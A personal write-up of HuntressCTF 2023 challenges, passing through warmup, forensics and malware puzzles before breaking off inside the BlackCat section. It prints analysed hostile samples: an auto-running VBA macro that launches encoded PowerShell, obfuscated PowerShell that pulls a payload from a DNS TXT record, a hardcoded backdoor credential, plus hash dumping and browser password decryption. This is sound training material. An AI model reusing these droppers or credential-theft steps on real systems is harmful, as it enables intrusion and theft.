Here are my solutions for the challenges I solved as a part of HuntressCTF 2023. I solved a total of 57 challenges over the course of this CTF, most of which are included in this writeup. My favorite challenges are denoted by a ⭐ emoji! The challenge solve table with timestamps is at [the bottom](#results).

- [[Warmups] F12 (Easy)](#f12)
- [[Warmups] String Cheese (Easy)](#string-cheese)
- [[Warmups] Layered Security (Easy)](#layered-security)
- [[Warmups] Comprezz (Easy)](#comprezz)
- [[Warmups] Chicken Wings (Easy)](#chicken-wings)
- [[Forensics] Opposable Thumbs (Easy)](#opposable-thumbs)
- [[Forensics] Dumpster Fire (Easy)](#dumpster-fire)
- [[Forensics] Wimble (Easy) ⭐](#wimble)
- [[Forensics] Traffic (Medium)](#traffic)
- [[Forensics] Rogue Inbox (Medium)](#rogue-inbox)
- [[Forensics] Backdoored Splunk (Medium)](#backdoored-splunk)
- [[Forensics] Bad Memory (Medium)](#bad-memory)
- [[Forensics] Tragedy (Medium)](#tragedy)
- [[Forensics] Texas Chainsaw Massacre: Tokyo Drift (Hard)](#texas-chainsaw-massacre-tokyo-drift)
- [[Malware] HumanTwo (Easy)](#humantwo)
- [[Malware] BlackCat (Easy) ⭐](#blackcat)
- [[Malware] PHP Stager (Easy)](#php-stager)
- [[Malware] VeeBeeEee (Easy)](#veebeeeee)
- [[Malware] OpenDir (Medium)](#opendir)
- [[Malware] Snake Oil (Medium)](#snake-oil)
- [[Malware] Operation Eradication (Medium)](#operation-eradication)
- [[Malware] Speakfriend (Medium)](#speakfriend)
- [[Malware] Thumb Drive (Medium)](#thumb-drive)
- [[Malware] Babel (Medium)](#babel)
- [[Malware] Hot off the Press (Medium)](#hot-off-the-press)
- [[Malware] Snake Eater II](#snake-eater-ii)
- [[Malware] Black Cat II (Hard) ⭐](#black-cat-ii)
- [[OSINT] Under The Bridge (Medium)](#under-the-bridge)
- [[OSINT] Operation Not Found (Medium)](#operation-not-found)
- [[OSINT] Where am I? (Medium)](#where-am-i)
- [[M365] General Info (Easy)](#m365-general-info)
- [[M365] Conditional Access (Easy)](#m365-conditional-access)
- [[M365] Teams (Easy)](#m365-teams)
- [[M365] The President (Easy)](#m365-the-president)
- [[Misc] PRESS PLAY ON TAPE (Easy)](#press-play-on-tape)
- [[Misc] Welcome to the Park (Easy)](#welcome-to-the-park)
- [[Misc] Indirect Payload (Medium)](#indirect-payload)
- [[Misc] MFAtigue (Medium) ⭐](#mfatigue)
- [[Misc] Rock, Paper, Psychic (Medium) ⭐](#rock-paper-psychic)
- [[Stego] Land Before Time (Easy)](#land-before-time)

## F12
During this challenge we are presented with a website that has a button with the text "Capture The Flag" and, when clicked, opens a popup for a split second. The actual code behind the button is:

```xml
<script type="text/javascript">
    function ctf() {
        window.open("./capture_the_flag.html", 'Capture The Flag', 'width=400,height=100%,menu=no,toolbar=no,location=no,scrollbars=yes');
    }
</script>
```

To solve this I navigated manually to the `capture_the_flag.html` file on the webserver which contained the flag hidden from display by CSS inside of a `<span>` element:

```
<span style="display:none">
    flag{03e8ba07d1584c17e69ac95c341a2569}
</span>
```

## String Cheese
This challenge downloaded just a 612x408px JPEG picture of string cheese with one of the string cheeses split apart at the end. It still had EXIF data from iStockPhoto, but this wasn't where the flag was. Still thank you to Diana Taliun for the cheese photo! I did find the flag by running `strings` against it however:

```
$ strings cheese.jpg  | grep flag
flag{f4d9f0f70bf353f2ca23d81dcf7c9099}
```

## Layered Security
This challenge presented me with a file called `layered_security` with no extension, so I ran the `file` command on it:

```
$ file layered_security 
layered_security: GIMP XCF image data, version 011, 1024 x 1024, RGB Color
```

I added back the `.xcf` extension and opened it in GIMP. It was a photo with 10 layers of AI-generated faces, and one of them had the flag:

```
flag{9a64bc4a390cb0ce31452820ee562c3f}
```

## Comprezz
This challenge downloaded another extensionless file called `comprezz` and I took some time to figure out what I was working with:

```
$ file comprezz 
comprezz: compress'd data 16 bits
$ hexdump -C comprezz 
00000000  1f 9d 90 66 d8 84 39 b3  27 46 0e 1b 61 6e c4 a0  |...f..9.'F..an..|
00000010  91 03 86 98 1b 62 6a d4  18 43 43 86 18 33 34 68  |.....bj..CC..34h|
00000020  cc 90 71 83 86 99 1c 66  30 5a ec a3 00           |..q....f0Z...|
0000002d
```

This is Unix compression, so I can inflate it like this:

```
$ mv comprezz comprezz.z
$ uncompress comprezz.z
$ cat comprezz
flag{196a71490b7b55c42bf443274f9ff42b}
```

## Chicken Wings
This one was a little confusing at first. It was a file, again with no extension, in UTF-8 encoding that only had emojis in it. I thought it might be a rotational cipher, but it was 57 characters and the flag should be only 38. I then went down a rabbit hole of attempting to figure out how UTF-8 could be used to hide data before I googled the string and found out it was something related to the Wingdings font. There is an online translator that I used to get the flag:

```
Wingdings: ...
Translated: flag{e0791ce68f718188c0378b1c0a3bdc9e}
```

I guess the name was really a hint!

## CaesarMirror
This challenge gave us a file with the following contents:

```
     Bu obl! Jbj, guvf jnezhc punyyratr fher   bf V !erugrtbg ghc bg ahs sb gby n fnj 
    qrsvavgryl nofbyhgryl nyjnlf ybir gelvat   ftavug rivgnibaav qan jra ch xavug bg 
       gb qb jvgu gur irel onfvp, pbzzba naq   sb genc gfevs ruG !frhdvauprg SGP pvffnyp 
     lbhe synt vf synt{whyvhf_ naq gung vf n   tavuglerir gba fv gv gho gengf gnret 
 gung lbh jvyy arrq gb fbyir guvf punyyratr.    qan rqvu bg tavleg rxvy g'abq V 
  frcnengr rnpu cneg bs gur synt. Gur frpbaq   bq hbl gho _n_av fv tnys rug sb genc 
   arrq whfg n yvggyr ovg zber. Jung rknpgyl   rxnz qan leg bg reru rqhypav rj qyhbuf 
     guvf svyyre grkg ybbx zber ratntvat naq   ?fravyjra qqn rj qyhbuF ?ryvujugebj 
    Fubhyq jr nqq fcnprf naq gel naq znxr vg   uthbar fv fravy lanz jbU ?ynpvegrzzlf 
 gb znxr guvf svyyre grkg ybbx oryvrinoyr? N    n avugvj ferggry sb renhdf qvybf 
 fvzcyr, zbabfcnpr-sbag grkg svyr ybbxf tbbq   rug gn gfbzyn rj reN .rz bg uthbar 
   raq? Vg ybbxf yvxr vg! V ubcr vg vf tbbq.   }abvgprysre fv tnys ehbl sb genc qevug ruG 
naq ng guvf cbvag lbh fubhyq unir rirelguvat   ebs tnys fvug gvzohf bg qrra hbl gnug 
    cbvagf. Gur ortvaavat vf znexrq jvgu gur   ,rpneo lyehp tavarcb rug qan kvsrec tnys 
  naq vg vapyhqrf Ratyvfu jbeqf frcnengrq ol   lyehp tavfbyp n av qar bg ,frebpferqah 
  oenpr. Jbj! Abj GUNG vf n PGS! Jub xarj jr   fvug bg erucvp enfrnp rug xyvz qyhbp 
            rkgrag?? Fbzrbar trg gung Whyvhf   !ynqrz n lht enfrnP    
```

I split it into left and right portions using regex. The left portion was ROT-13 encoded, and decoded to this:

```
     Oh boy! Wow, this warmup challenge
    definitely absolutely always love 
       to do with the very basic, common a
     your flag is flag{julius_ and th
 that you will need to solve this
  separate each part of the flag. The
   need just a little bit more. What ex
     this filler text look more enga
    Should we add spaces and try and m
 to make this filler text look bel
 simple, monospace-font text file l
   end? It looks like it! I hope it is good
and at this point you should have ever
    points. The beginning is marked with 
  and it includes English words separat
  brace. Wow! Now THAT is a CTF! Who 
            extent?? So
```

Whereas the right portion was encoded the same way and decoded to this:

```
    Caesar guy a medal!   
 could milk the caesar cipher to this   
 underscores, to end in a closing curly   
 flag prefix and the opening curly brace,   
 that you need to submit this flag for   
 The third part of your flag is reflection}   
 enough to me. Are we almost at the   
 solid square of letters within a    
 symmetrical? How many lines is enough   
 worthwhile? Should we add newlines?   
 should we include here to try and make   
 part of the flag is in_a_ but you do   
 I don't like trying to hide and    
 great start but it is not everything   
 classic CTF techniques! The first part of   
 to think up new and innovative things   
 was a lot of fun to put together! I so  
```

This gives us the final flag (you need to read the paragraphs as they give you explicit instructions on how to construct the flag):

```
flag{julius_in_a_reflection}
```

## Book By Its Cover
This is just a file with the wrong extension. The file header indicates it is a PNG, and opening it as a PNG revealed the flag:

```
flag{f8d32a346745a6c4bf4e9504ba5308f0}
```

## BaseFFFF+1
This challenge, as the title suggests, was in [base65536](https://github.com/qntm/base65536). I decoded it with an online decoder to get the flag:

```
flag{716abce880f09b7cdc7938eddf273648}
```

## Baking
This was a live web instance challenge. It was basically an oven with buttons on some things you could cook such as brownies and muffins. Each item had a specific amount of time it would take which would trigger a counter, but the "Magic Cookies" which I assumed contained the flag were set to 7200 minutes.

Taking the hint, I looked at the cookies for the website:

```
in_oven eyJyZWNpcGUiOiAiTWFnaWMgQ29va2llcyIsICJ0aW1lIjogIjEwLzI3LzIwMjMsIDAxOjU1OjA3In0=
```

This decoded to:

```json
{"recipe": "Magic Cookies", "time": "10/27/2023, 01:55:07"}
```

I simply changed it to be way ahead of done, re-encoded it, and overwrote my cookie, and when I refreshed the page my flag was printed!

## Dialtone
This was a challenge that had to do with DTMF tones that phones use. I found an online tool to extract the digits from DTMF recordings online and got this number:

```
13040004482820197714705083053746380382743933853520408575731743622366387462228661894777288573
```

Then I converted this large number back to bytes using a Python interpreter:

```python
>>> bigint = 13040004482820197714705083053746380382743933853520408575731743622366387462228661894777288573
>>> bytearray.fromhex('{:0192x}'.format(bigint))
bytearray(b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00flag{6c733ef09bc4f2a4313ff63087e25d67}')
```

## Opposable Thumbs
This challenge just presented as a `thumbcache.db` file. This file is found on Windows systems, and is used as a cache to store thumbnails for files when they are viewed using Explorer. The flag was just displayed on one of these cached thumbnailes. I used Thumbcache Viewer to extract them.

```
flag{human_after_all}
```

## Dumpster Fire
This was just a tar archive of a filesystem from a Linux system. The challenge prompt hinted towards foxes and I could tell Firefox was installed on the system so I assumed it would be in one of Firefox's SQLite databases. These are located in the Firefox profiles and on Linux are usually located in a user's home directory. In this case they were under:

```
/home/challenge/.mozilla/firefox/bc1m1zlr.default-release
```

For this challenge I used a software called DB Browser for SQLite. I saw that there was browsing history for a site `http://localhost:31337`. Firefox stores login credentials in a file called `logins.json`, and encrypts them with material from another file `key4.db`. In the `logins.json` file there was indeed an entry for this website, so I extracted the password using [firefox_decrypt](https://github.com/unode/firefox_decrypt).

In this case, the password was the flag.

```
$ python3 firefox_decrypt.py bc1m1zlr.default-release/
2023-10-25 20:00:24,530 - WARNING - profile.ini not found in bc1m1zlr.default-release/
2023-10-25 20:00:24,530 - WARNING - Continuing and assuming 'bc1m1zlr.default-release/' is a profile location

Website:   http://localhost:31337
Username: 'flag'
Password: 'flag{35446041dc161cf5c9c325a3d28af3e3}'
```

## Wimble
This challenge downloaded a 7z archive, and when inflated produced a `.wim` file. 

```
$ file fetch 
fetch: Windows imaging (WIM) image v1.13, XPRESS compressed, reparse point fixup
```

I didn't know what this extension was, but when I added it back to the file it behaved like an archive. Inside were a lot of prefetch files. In short, prefetch stores what files/libraries a program accesses in the first 10 seconds that it runs. I used a tool called PECmd by Eric Zimmerman to parse all of them:

```
PECmd.exe -d prefetch_files > parser_output.txt 
```

One of the files referenced was the flag:

```
61: \VOLUME{01d89fa75d2a9f57-245d3454}\USERS\LOCAL_ADMIN\DESKTOP\FLAG{97F33C9783C21DF85D79D613B0B258BD}
```

## Traffic
I spent some time looking through the logs and collecting some baseline information for these exports. Some notes:

- From the `conn.*.log` files, there are two DNS servers being used, `1.1.1.1` and `1.0.0.1`
- There is one internal host seen at `10.24.0.2`
- The following HTTP User-Agents are seen from this host (Sourced from the `http.*.log` files:
  - `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36`
  - `Microsoft-CryptoAPI/10.0`
  - `MICROSOFT_DEVICE_METADATA_RETRIEVAL_CLIENT`

The first place I wanted to look at were the DNS logs. After all, if the user connected to a suspected malicious site, the site must have been queried. I started filtering it down, removing some TLDs such as `.edu`, `.gov` to reduce noise. I found the following suspect entry:

```
1.1.1.1	53	udp	9027	0.043605	sketchysite.github.io
```

The domain `sketchysite.github.io` resolved to the following addresses:
- `185.199.108.153`
- `185.199.109.153`
- `185.199.110.153`
- `185.199.111.153`

I visited this site and it had the flag listed:

```
flag{8626fe7dcd8d412a80d0b3f0e36afd4a}
```

## Rogue Inbox 
The challenge states that the user DebraB has potentially been compromised. From the provided M365 logs, it seems this user's E-mail address is ```DebraB@M365B132131.OnMicrosoft.com```.

After some preliminary log analysis, I came up with the following timeline of interesting events tied to the account:

```
9/26/2023 1:52 DebraB login from 185.73.124.135
9/26/2023 1:56 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "f"}]
9/26/2023 1:56 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "l"}]
9/26/2023 1:57 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "a"}]
9/26/2023 1:57 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "g"}]
9/26/2023 1:58 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "{"}]
9/26/2023 1:58 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "2"}]
9/26/2023 1:59 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "4"}]
9/26/2023 1:59 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "c"}]
9/26/2023 2:00 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "4"}]
9/26/2023 2:00 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "2"}]
9/26/2023 2:01 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "3"}]
9/26/2023 2:01 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "0"}]
9/26/2023 2:02 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "f"}]
9/26/2023 2:02 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "a"}]
9/26/2023 2:02 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "d"}]
9/26/2023 2:03 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "e"}]
9/26/2023 2:03 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "e"}]
9/26/2023 2:04 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "f"}]
9/26/2023 2:04 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "3"}]
9/26/2023 2:04 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "9"}]
9/26/2023 2:05 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "2"}]
9/26/2023 2:05 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "b"}]
9/26/2023 2:06 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "2"}]
9/26/2023 2:06 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "c"}]
9/26/2023 2:07 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "8"}]
9/26/2023 2:07 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "5"}]
9/26/2023 2:07 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "0"}]
9/26/2023 2:08 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "f"}]
9/26/2023 2:08 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "7"}]
9/26/2023 2:09 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "4"}]
9/26/2023 2:09 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "b"}]
9/26/2023 2:09 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "0"}]
9/26/2023 2:10 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "f"}]
9/26/2023 2:10 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "6"}]
9/26/2023 2:10 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "}"}]
```

The `New-Inbox` operations are one of the first things I look for from prior experience working on business email compromise incidents. I just used Excel to analyze these logs, and filtered for the suspected compromised account and for the operation `New-Inbox`. Normally an attacker does not create this many rules, but extracting the rule names gives us the flag:

```
flag{24c4230fa7d50eef392b2c850f74b0f6}
```

## Backdoored Splunk
This is an instance-based challenge. When I connect to the instance I get the following error:

```
$ curl -i http://chal.ctf.games:30866/
HTTP/1.1 401 UNAUTHORIZED
Content-Type: application/json
Content-Length: 52

{"error":"Missing or invalid Authorization header"}
```

At this point I assumed that to get the flag it was necessary to authorize ourselves. The challenge file is a copy of a Splunk Add-on for Windows directory, for version `8.7.0`. I didn't know much about this so I took a look at the [documentation](https://docs.splunk.com/Documentation/AddOns/released/Windows/AbouttheSplunkAdd-onforWindows), which didn't reveal much.

Looking at the files, I noticed most of them were created on `5/10/2023`, but there was a directory of PowerShell scripts that was created on `9/19/2023`. I started to look for any credentials that may have been included in these scripts and found this in the file `nt6-health.ps1`:

```powershell
$OS = @($html = (Invoke-WebRequest http://chal.ctf.games:$PORT -Headers @{Authorization=("Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg==")} -UseBasicParsing).Content
```

So I passed this over to the instance:

```
$ curl -i http://chal.ctf.games:30866/ -H "Authorization: Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg=="
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 69

<!-- ZWNobyBmbGFnezYwYmIzYmZhZjcwM2UwZmEzNjczMGFiNzBlMTE1YmQ3fQ== -->
```

Then decoded the returned Base64:

```
$ echo "ZWNobyBmbGFnezYwYmIzYmZhZjcwM2UwZmEzNjczMGFiNzBlMTE1YmQ3fQ==" | base64 -d
echo flag{60bb3bfaf703e0fa36730ab70e115bd7}
```

## Bad Memory
This was a memory forensics challenge, so I enlisted the help of volatility. The decompressed file was 4GB.

I wasn't sure what password was being requested. I went ahead assuming it was the user profile's password for their user account.

Initially I tried to see if there was anything in the password reminder questions, located in `SAM\Domains\Account\Users\000003E9` but this didn't turn up any results as they were filled with nonsense answers.

Next, I dumped the user account hashes:

```
python vol.py -f image.bin windows.hashdump
Volatility 3 Framework 2.5.2
User	rid		lmhash								nthash
congo	1001	aad3b435b51404eeaad3b435b51404ee	ab395607d3779239b83eed9906b4fb92
```

I ran the nthash through crackstation and got a match for the password `goldfish#`. All that was left was to get the MD5 hash:

```
$ echo -n 'goldfish#' | md5sum
2eb53da441962150ae7d3840444dfdde  -
```

Therefore, the flag is `flag{2eb53da441962150ae7d3840444dfdde}`.

## Tragedy
This file appeared to be a ZIP archive:

```
$ file tragedy_redux 
tragedy_redux: Zip archive data
```

But upon closer inspection, it had the following contents:

```
_rels
word
docProps
[Content_Types].xml
```

This indicates that it is actually a Microsoft Word file. These aren't really files per se, but ZIP archives. Regardless, inside the archive we see evidence that it contains an embedded VBA macro, such as a file named `vbaProject.bin`. I extracted this file as it is a compiled VBA resource. The tool I chose to attempt to decompile it was `oletools`:

```
python oletools\olevba.py ..\tragedy_redux\vbaProject.bin
```

Which produced the following output:

```vb
Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Do
    OatMilk = OatMilk + Pears(Strawberries(Milk))
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = OatMilk
End Function


Function Bears(Cows)
    Bears = StrReverse(Cows)
End Function

Function Tragedy()
    
    Dim Apples As String
    Dim Water As String

    If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then
        Exit Function
    End If
    
    Apples = "129128136118131132121118125125049062118127116049091088107132106104116074090126107132106104117072095123095124106067094069094126094139094085086070095139116067096088106065107085098066096088099121094101091126095123086069106126095074090120078078"
    Water = Nuts(Apples)


    GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin

End Function

Sub AutoOpen()
    Tragedy
End Sub
```

I wanted this in something that I can actually interpret and play around with (I am clueless when it comes to VBA) so I converted it to Python and printed some of the more interesting variables I wanted to track: 

```python
def pears(beets):
    return chr(int(beets) - 17)

def strawberries(grapes):
    return grapes[:3]

def almonds(jelly):
    return jelly[3:]

def nuts(milk):
    oat_milk = ""
    while len(milk) > 0:
        oat_milk += pears(strawberries(milk))
        milk = almonds(milk)
    return oat_milk

def bears(cows):
    return cows[::-1]

def tragedy():
    apples = "129128136118131132121118125125049062118127116049091088107132106104116074090126107132106104117072095123095124106067094069094126094139094085086070095139116067096088106065107085098066096088099121094101091126095123086069106126095074090120078078"
    print("If ActiveDocument.Name <> " + nuts("131134127127118131063117128116"))
    water = nuts(apples)
    print(water)

tragedy()
```

This results in the following:

```
If ActiveDocument.Name <> runner.doc
powershell -enc JGZsYWc9ImZsYWd7NjNkY2M4MmMzMDE5Nzc2OGY0ZDQ1OGRhMTJmNjE4YmN9Ig==
```

So it seems that the macro checks if the document is named `runner.doc`, and if so proceeds to executed an encoded powershell command. Powershell uses Base64 for its default encoding, and throwing this into CyberChef gives us the flag:

```
$flag="flag{63dcc82c30197768f4d458da12f618bc}"
```

## Texas Chainsaw Massacre Tokyo Drift
In this challenge, we are presented with an event log and told that a "rogue process" was detected on the endpoint when the user attempted to install a video game called "Texas Chainsaw Massacre." Scrolling through the event log I saw this interesting potentially related event:

```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="MsiInstaller" /> 
  <EventID Qualifiers="0">1337</EventID> 
  <Version>0</Version> 
  <Level>4</Level> 
  <Task>0</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x80000000000000</Keywords> 
  <TimeCreated SystemTime="2023-10-10T16:02:47.088023300Z" /> 
  <EventRecordID>1785</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="9488" ThreadID="0" /> 
  <Channel>Application</Channel> 
  <Computer>DESKTOP-JU2PNRI</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data>Windows Installer installed the product. Product Name: The Texas Chain Saw Massacre (1974). Product Version: 8.0.382.5. Product Language: English. Director: Tobe Hooper. Installation success or error status: 0.</Data> 
  <Binary>2828272E2028205...</Binary> 
  </EventData>
  </Event>
```

I've truncated the `<Binary>` XML element because it was rather large, but I threw it into CyberChef and got the following:

```powershell
(('. ( ZT6ENv:CoMSpEc[4,24,'+'25]-joinhx6hx6)( a6T ZT6( Set-variaBle hx6OfShx6 hx6hx6)a6T+ ( [StriNg'+'] [rEGeX]::mAtcheS( a6T ))421]RAhC[,hx6fKIhx6eCALPeR-  93]RAhC[,)89]RAhC[+84]RAhC[+98]RAhC[( EcalPeRC-  63]RAhC[,hx6kwlhx6EcalPeRC-  )hx6)bhx6+hx60Yb0Yhx6+hx6niOj-]52,hx6+hx642,hx6+'+'hx64[cehx6+hx6phx6+hx6SMoC:Vnhx6+hx6ekwl ( hx6+hx6. fKI ) (DnEOTDAhx6+hx6ehx6+hx6r.)} ) hx6+'+'hx6iicsA:hx6+hx6:]GnidOcNhx6+hx6e.hx6+hx6Thx6+hx6xethx6+hx6.hx6+hx6METsys[hx6+hx6 ,_kwhx6+h'+'x6l (REDhx6+hx6AeRmaertS.o'+'Ihx6+hx6 thx6+hx6Chx6'+'+hx6ejbO-Wh'+'x6+hx6En { HCaERoFhx6+hx6fKI) sSERpM'+'oCehx6+hx'+'6dhx6+hx6::hx6+hx6]'+'edOMhx6+hx6'+'nOisSErPMochx6+hx6.NoISSerhx6+hx6pMOc.oi[, ) b'+'0Yhx6+hx6==wDyD4p+S'+'s/l/hx6+hx6i+5GtatJKyfNjOhx6+'+'hx63hx6+hx63hx6+hx64Vhx6+hx6vj6wRyRXe1xy1pB0hx6+hx6AXVLMgOwYhx6+hx6//hx6+hx6Womhx6+hx6z'+'zUhx6+hx6tBhx6+hx6sx/ie0rVZ7hx6+hx6xcLiowWMGEVjk7JMfxVmuszhx6+hx6OT3XkKu9TvOsrhx6+hx6bbhx6+hx6cbhx6+hx6GyZ6c/gYhx6+hx6Npilhx6+hx6BK7x5hx6+hx6Plchx6+hx68qUyOhBYhx6+hx6VecjNLW42YjM8SwtAhx6+hx6aR8Ihx6+hx6Ohx6+hx6whx6+hx6mhx6+hx66hx6+hx6UwWNmWzCw'+'hx6+hx6VrShx6+hx6r7Ihx6+hx6T2hx6+hx6k6Mj1Muhx6+hx6Khx6+hx6T'+'/oRhx6+hx6O5BKK8R3NhDhx6+hx6om2Ahx6+hx6GYphx6+hx6yahx6+hx6TaNg8DAneNoeSjhx6+h'+'x6ugkTBFTcCPaSH0QjpFywhx6+'+'hx6aQyhx'+'6+hx6HtPUG'+'hx'+'6+hx6DL0BK3hx6+h'+'x6lClrHAvhx6+h'+'x64GOpVKhx6+hx6UNhx6+hx6mGzIDeraEvlpc'+'kC9EGhx6+hx6gIaf96jSmShx6'+'+hx6Mhhx6+hx6hhx6+hx6RfI72hx6+hx6oHzUkDsZoT5hx6+hx6nhx6+hx6c7MD8W31Xq'+'Khx6+hx6d4dbthx6+hx6bth1RdSigEaEhx6+hx6JNERMLUxV'+'hx6+hx6ME4PJtUhx6+hx6tSIJUZfZhx6+hx6EEhx6+hx6Ahx6+hx6JsTdDZNbhx6+hx60Y(gniRTS4hx6+hx66esh'+'x6+hx6aBmoRF::]tRevnOhx6+hx6C[]MAertsYrOmeM.Oi.mETSYs[ (MaErhx6+hx6thx6+hx6sEtALfeD.NOhx6+hx6IsS'+'erPmo'+'c.OI.mehx6+hx6TsYShx6'+'+hx6 hx6+hx6 tCejbO-WEhx6+hx6n ( hx6(((no'+'IsseRpX'+'e-ekovni a6T,hx6.hx6,hx6RightToLEFthx6 ) RYcforEach{ZT6_ })+a6T ZT6( sV hx6oFshx6 hx6 hx6)a6T ) ')  -cREpLACE ([cHAr]90+[cHAr]84+[cHAr]54),[cHAr]36 -rEPlAce'a6T',[cHAr]34  -rEPlAce  'RYc',[cHAr]124 -cREpLACE  ([cHAr]104+[cHAr]120+[cHAr]54),[cHAr]39) |. ( $vERboSEpreFeRenCe.tOStrING()[1,3]+'x'-JOin'')
```

This looks like obfuscated powershell based on the presence of some noticable strings such as `CoMSpEc`, `vERboSEpreFeRenCe`, or `[rEGeX]::mAtcheS`. I used a tool called [PowerDecode](https://github.com/Malandrone/PowerDecode) to attempt to deobfuscate it and got the following script:

```powershell
try {
    $TGM8A = Get-WmiObject MSAcpi_ThermalZoneTemperature -Namespace "root/wmi" -ErrorAction 'silentlycontinue'; 
    if ($error.Count -eq 0) { 
        $5GMLW = (Resolve-DnsName eventlog.zip -Type txt | ForEach-Object { $_.Strings }); 
        if ($5GMLW -match '^[-A-Za-z0-9+/]*={0,3}$') { 
            [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($5GMLW)) | Write-Host 
        } 
    } 
    } catch { }
```

It did an amazing job, right? Anyway, it looks to be querying a TXT DNS record from the domain `eventlog.zip` (yes, .zip is now a valid TLD!). I ran a dig query to see what was there:

```
$ dig -t TXT eventlog.zip

; <<>> DiG 9.18.12-0ubuntu0.22.04.3-Ubuntu <<>> -t TXT eventlog.zip
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 9491
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
;; QUESTION SECTION:
;eventlog.zip.			IN	TXT

;; ANSWER SECTION:
eventlog.zip.		3600	IN	TXT	"U3RhcnQtUHJvY2VzcyAiaHR0cHM6Ly95b3V0dS5iZS81NjFubmQ5RWJzcz90PTE2IgojZmxhZ3s0MDk1MzczNDdjMmZhZTAxZWY5ODI2YzI1MDZhYzY2MH0jCg=="
```

The Base64-encoded TXT record returns:

```
Start-Process "https://youtu.be/561nnd9Ebss?t=16"
#flag{409537347c2fae01ef9826c2506ac660}#
```

## HumanTwo
This was a large collection of `human2.aspx` backdoors from the MOVEIt incident. I ran a diff on a few of them and the only lines that differed were in the `Page_load()` function on line 36. For example:

```php
if (!String.Equals(pass, "24068cbf-de5f-4cd2-9ad6-ba7cdb7bbfa9"))
if (!String.Equals(pass, "3b321587-d075-4221-9628-b6c8959841df"))
```

So I dumped all of these lines and found one that was far different from the rest: 

```php
if (!String.Equals(pass, "666c6167-7b36-6365-3666-366131356464"+"64623065-6262-3333-3262-666166326230"+"62383564-317d-0000-0000-000000000000"))
```

The UUIDs here are actually ASCII encoded as hexadecimal. The flag after converting it is:

```
flag{6ce6f6a15dddb0ebb332bfaf2b0b85d1}
```

## Snake Eater


## BlackCat
This was the first reverse engineering/malware challenge of the CTF. It is a ransomware sample with a few files that were encrypted by it. The ransom note states that it uses "military-grade encryption." Taking a look at the samples of encrypted files, the entropy looked too low to be something like AES so I knew right away something was up.

I started messing around with inserting different keys into the program. It seems that the minimum length of the key is 8 characters, anything less and it complains that the key is too small and refuses to decrypt the files.

After some more testing, I noticed it seems to have something to do with XOR. Look at what happens when we use the key `ABCDEFGH`.

```
Encrypted:
00000000  28 0A 16 1D 06 0C 08 49 0E 16 53 0B 03 03 08 49  |(......I..S....I|
